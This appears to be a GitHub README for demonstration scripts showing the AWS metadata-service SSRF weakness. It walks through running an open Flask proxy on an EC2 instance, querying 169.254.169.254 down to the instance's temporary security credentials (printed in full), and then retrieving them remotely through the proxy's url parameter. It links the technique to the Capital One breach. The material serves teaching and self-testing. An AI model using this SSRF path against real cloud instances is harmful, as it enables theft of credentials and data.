# cloud-instance-metadata-test-tools
Here are some very useful Python Scripts to test cloud instances for the very well known open meta-data service vulnerability within AWS and other Cloud Providers.  So what we have is a very simple python proxy server (proxy-server.py) to expose the AWS meta-data service, and the (get-info.py) for retrieving parameters like hostname, IP address, and MAC address through an EC2 instance.

***Note: The prerequisites for a Linux-AMI Instance in EC2 are to install python-pip and git; AND subsequently the "requests" and "flask" python modules via PIP install.  Also,the examples here will be different in regards to your EC2 environment, with names IPs, etc., what is listed here is just for reference. You will also have to edit your Inbound Rules in the Security Group for this instance by adding an Inbound Rule for port 8080.***

### INSTALLATION STEPS FOR a Linux-AMI Instance within EC2:
	[ec2-user@ip-172.31.x.x ~]$ sudo yum install git -y
	[ec2-user@ip-172.31.x.x ~]$ sudo yum install python-pip -y
	[ec2-user@ip-172.31.x.x ~]$ sudo pip install flask

You may have to install the "requests" module, but it looks like it is already installed on current Linux-AMI instances as of 5/1/2020...

	[ec2-user@ip-172.31.x.x ~]$ sudo pip install requests
	Requirement already satisfied: requests in /usr/lib/python2.7/dist-packages

### Next is to clone the repository from Github for the proxy server and get-info python scripts

	[ec2-user@ip-172.31.x.x ~]$ git clone https://github.com/gahlberg/cloud-instance-metadata-test-tools.git
	Cloning into 'cloud-instance-metadata-test-tools'...
	remote: Enumerating objects: 20, done.
	remote: Counting objects: 100% (20/20), done.
	remote: Compressing objects: 100% (19/19), done.
	remote: Total 20 (delta 7), reused 0 (delta 0), pack-reused 0
	Unpacking objects: 100% (20/20), done.
	[ec2-user@ip-172.31.x.x ~]$ ls 
	cloud-instance-metadata-test-tools
	[ec2-user@ip-172.31.x.x ~]$ cd cloud-instance-metadata-test-tools/
	[ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ 
	
### For simplicity and speed we will just open up the python scripts to be able to execute
	[ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ chmod 777 get-info.py 
	[ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ chmod 777 proxy-server.py 
### To start, run the Get-Info script to get details on the Linux-AMI instance which should be a valid request for retrieving information on that EC2 instance:
	[ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ ./get-info.py 
	Hostname: ip-172.31.x.x.ec2.internal
	Private-ipv4-Address: 172.31.x.x
	MAC-Address: 12:78:85:2e:e2:9b
### And next we will run the proxy server script to simulate our Server Side Request Forgery (SSRF):
	[ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ ./proxy-server.py 
	 * Serving Flask app "proxy-server" (lazy loading)
	 * Environment: production
	   WARNING: This is a development server. Do not use it in a production deployment.
	   Use a production WSGI server instead.
	 * Debug mode: on
	 * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)
	 * Restarting with stat
	 * Debugger is active!
	 * Debugger PIN: 296-577-211
 
### Ok, so now we have the SSRF running on the AWS Instance...

#### But first in another SSH session to our Linux-AMI instance, let's start navigating the vulnerability with our python interpreter on that particular Instance.  Note that the commands listed below are how you can navigate through the the hierachy of the Meta-Data Service, obviously we need to import the "requests" python module:

	[ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ python
	Python 2.7.16 (default, Feb 10 2020, 18:54:57) 
	[GCC 4.8.5 20150623 (Red Hat 4.8.5-28)] on linux2
	Type "help", "copyright", "credits" or "license" for more information.
	>>> import requests
	>>> print requests.get("http://169.254.169.254/").text
	1.0
	2007-01-19
	2007-03-01
	2007-08-29
	2007-10-10
	2007-12-15
	2008-02-01
	2008-09-01
	2009-04-04
	2011-01-01
	2011-05-01
	2012-01-12
	2014-02-25
	2014-11-05
	2015-10-20
	2016-04-19
	2016-06-30
	2016-09-02
	2018-03-28
	2018-08-17
	2018-09-24
	2019-10-01
	latest
	>>> print requests.get("http://169.254.169.254/latest").text
		dynamic
		meta-data
		user-data
	>>> print requests.get("http://169.254.169.254/latest/meta-data").text
		ami-id
		ami-launch-index
		ami-manifest-path
		block-device-mapping/
		events/
		hostname
		identity-credentials/
		instance-action
		instance-id
		instance-type
		local-hostname
		local-ipv4
		mac
		metrics/
		network/
		placement/
		profile
		public-hostname
		public-ipv4
		public-keys/
		reservation-id
		security-groups
		services/
	>>> print requests.get("http://169.254.169.254/latest/meta-data/identity-credentials").text
		ec2/
	>>> print requests.get("http://169.254.169.254/latest/meta-data/identity-credentials/ec2").text
		info
		security-credentials/
	>>> print requests.get("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials").text
		ec2-instance
	>>> print requests.get("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance").text
		{
		  "Code" : "Success",
		  "LastUpdated" : "2020-05-07T22:09:26Z",
		  "Type" : "AWS-HMAC",
		  "AccessKeyId" : "ASIA5ZL6OWN43E322SVZ",
		  "SecretAccessKey" : "bvh4SjWKLx9C0vXvgbo0bmxAu86+p7MJpyb8kP7A",
		  "Token" : "IQoJb3JpZ2luX2VjEI///////////wEaCXVzLWVhc3QtMSJHMEUCIQCRiuYS8eyOfp8JuflJAFCKmBUqVa7cHRNDpJE9THqCZgIgXoY1xStydT3cvZ2tiYTPRZ0qS3gVPjnYYpfl/NoLY6EqyAMIx///////////ARAAGgw5NDc4NDIzNjQyODEiDG2Nwf/d+DcGABtZICqcAwuvGVOdhe9H8KCRh/wcDj436oft81PEcloEvyPFPKIYc+k4zeECnbm+ODX7CFrMYpx9KBQmgScQqnfWFIAujsCDtStpsfPDpnYNngd53uWk+HzC3jVMj1tBf2pqYqgnHP7Flceu+PQHQ5OVBIECj8BOXq92r1s/bKK8IDH/X1udm0DPrTB5C8HZJnc2wTzbSB2s9VPzZHXaRvqezX2Z08s2hVqHitzpcL55uldDzevzfh0gcVs1e/GHgnpjyFixPstrLH3sZ9QDEg9oK7B90pbvQ1TsZBiUV25usRBq2lPylgyposo1+cCgwI9KtT+Kyftj0KvYCXS547nInlBUmfv7J67dxeTzqpbinv8hjc0VF4RYyKRmgOYQr/JMi6gjkULJJ/p2almI7L1F3UOB9HD4rXnCevrbRkZI3azpLeR45dhybDG/KKl9d+f1EVV05ND0j7Up03u8HxFiLWngyaDgrhJ/wnHCbMimXVv025DK6MFsL7C3vEsJh2+li00wJIslMGGjW6wVoCPgxvjEaOdUeWpRz3IVu6eU0yQwoY7S9QU65wEc7564BMrDU/Qm+4ZVmcCYeQmhAb4GBQRQKWRaD3itCsYFnf+4CAi9f0zzWp3i4rJBuh8aByGEcQW+aL24QzWD+5Kc+1XsJWZprqf5a695Wjt5RaCc1unmQHCfyYXVTIurqXwwNqRbBBc+4VnOdmYTuiNh+T1U68vzP/jufAWhAQ2NDgXV5kCpl/MAKFGTGJ8PMRsaebRIgIEhefQiQ9qlNa/sYWqsD3Z04NJL+LxG08QVPGkhRtF7xL8qmXavHivl2hwf1xmjPEymFIeEm7cbFBhZVAFD02F57v63EHW1j1aVp++gob4=",
		  "Expiration" : "2020-05-08T04:44:10Z"
		}
>>> 

### And look at that, we have retieved a secret access token - but, can we do this through the SSRF that is running on our other session?

### Just to check that the proxy-server.py is working and verify that proxy server can can actually redirect to a URL, lets try Google:
	http://ec2-54-86-5-206.compute-1.amazonaws.com:8080/?url=http://www.google.com
	
#### This should return a page like the following...
![Screenshot](docs/screenshots/google.png)

### OK, now we have verified that the proxy service is working...

#### So now, in a browser let's take what we were able to find within the AWS Instance meta-data from the python interpreter and put into a browser (as mentioned before this will be different according to your environment, but you get the idea...):
	http://ec2-54-86-5-206.compute-1.amazonaws.com:8080/?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance

#### And look at that, the same data is retrieved here!  

So as a remote user with a Server Side Request Forgery I can pass in an internal URL which is the AWS meta-data service, and with that I can grab access tokens out of it.  And if this paricular access token had access to the S3 bucket with millions of accounts containing private information, I now know that I have that information.  This is roughly how Erratic (from the Capitol One Breach) was able to post all this information up onto GitHub from the information that was taken from the S3 bucket from AWS Instances for all the User Accounts within Capitol One's AWS Instances back in the end of march in 2019; the question is how do you stop this? 

#### From AWS, there is not a concrete answer, just a warning that you may need to put appropriate controls in place:

![Screenshot](docs/screenshots/AWS-Instance-meta-data-warning.png)

https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
